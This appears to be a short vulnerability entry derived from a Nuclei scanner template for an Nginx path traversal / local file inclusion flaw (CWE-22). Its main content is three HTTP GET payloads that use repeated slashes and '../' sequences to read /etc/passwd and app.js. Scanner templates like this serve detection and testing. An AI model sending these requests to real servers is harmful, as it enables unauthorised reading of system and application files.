# Vulnerability: Nginx Server - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`nginx-merge-slashes-path-traversal.yaml`)

## Description
Nginx server is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}///////../../../etc/passwd
GET {{BaseURL}}/static///////../../../../etc/passwd
GET {{BaseURL}}///../app.js
```

